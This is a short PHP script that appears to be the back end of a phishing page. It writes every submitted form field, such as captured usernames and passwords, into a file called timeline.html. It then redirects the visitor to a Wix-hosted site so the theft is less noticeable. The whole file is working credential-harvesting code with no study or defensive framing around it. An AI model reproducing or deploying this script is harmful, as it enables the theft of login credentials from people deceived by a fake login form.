<?php
header ('Location: guddumodok.wixsite.com/guddumodok');
$handle = fopen("timeline.html", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

echo "<script type='text/javascript'>location.href = 'timeline.html';</script>";
        exit;
?>